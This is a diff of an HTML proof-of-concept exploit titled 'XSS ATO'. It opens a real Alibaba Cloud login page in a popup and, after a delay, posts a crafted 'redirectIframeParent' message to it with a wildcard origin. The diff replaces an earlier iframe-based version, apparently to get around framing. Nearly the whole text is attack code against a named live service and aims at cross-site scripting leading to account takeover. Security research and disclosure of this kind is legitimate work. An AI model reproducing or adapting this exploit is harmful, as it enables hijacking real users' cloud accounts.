@@ -2,20 +2,12 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Iframe PostMessage Example</title>
+  <title>XSS ATO</title>
 </head>
 <body>
 
-<iframe
-  id="myIframe"
-  src="https://account-cn.alibabacloud.com?mini_login_embedder=true"
-  width="800"
-  height="500"
-  style="border:1px solid #ccc">
-</iframe>
-
 <script>
-  const iframe = document.getElementById("myIframe");
+  let b = window.open("https://account-cn.alibabacloud.com?mini_login_embedder=true");
 
   const message2 = {
     action: "redirectIframeParent",
@@ -26,10 +18,12 @@
 
   const encodedData2 = encodeURIComponent(JSON.stringify(message2));
 
-  // Send message immediately after iframe loads
-  iframe.addEventListener("load", () => {
-    iframe.contentWindow.postMessage(encodedData2, "*");
-  });
+  // Send message after 5 seconds
+  setTimeout(() => {
+    if (!b.closed) {
+      b.postMessage(encodedData2, "*");
+    }
+  }, 5000);
 </script>
 
 </body>
